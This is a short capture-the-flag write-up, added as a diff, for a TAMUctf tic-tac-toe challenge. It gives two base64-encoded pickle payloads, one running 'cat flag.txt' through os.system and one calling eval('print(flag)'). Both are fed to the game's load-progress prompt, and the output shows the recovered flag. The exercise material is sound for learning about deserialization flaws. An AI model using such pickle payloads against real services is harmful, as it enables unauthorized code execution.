@@ -1,0 +1,49 @@
+======================== Solution 1: RCE ========================
+
+python exp1.py
+	Y3Bvc2l4CnN5c3RlbQpwMAooUydjYXQgZmxhZy50eHQnCnAxCnRwMgpScDMKLg==
+
+```
+openssl s_client -connect tamuctf.com:443 -servername tictactoe -quiet
+depth=0 CN = hulkcybr1
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = hulkcybr1
+verify return:1
+Welcome to my new game!  I bet you can't beat me 133713371337 times!!  You've won 0 times.
+1. Play game
+2. Redeem prize
+3. Save progress
+4. Load progress
+5. Check stats
+> 4
+What was the code I gave you last time? Y3Bvc2l4CnN5c3RlbQpwMAooUydjYXQgZmxhZy50eHQnCnAxCnRwMgpScDMKLg==
+gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}Traceback (most recent call last):
+  File "/pwn/game.py", line 149, in <module>
+    if get_hash(data['wins']) != data['security']:
+TypeError: 'int' object is not subscriptable
+```
+
+======================== Solution 2: builtin print ========================
+
+python exp2.py
+
+openssl s_client -connect tamuctf.com:443 -servername tictactoe -quiet
+depth=0 CN = hulkcybr1
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = hulkcybr1
+verify return:1
+Welcome to my new game!  I bet you can't beat me 133713371337 times!!  You've won 0 times.
+1. Play game
+2. Redeem prize
+3. Save progress
+4. Load progress
+5. Check stats
+> 4
+What was the code I gave you last time? Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMncHJpbnQoZmxhZyknCnAxCnRwMgpScDMKLg==
+gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}
+Traceback (most recent call last):
+  File "/pwn/game.py", line 149, in <module>
+    if get_hash(data['wins']) != data['security']:
+TypeError: 'NoneType' object is not subscriptable
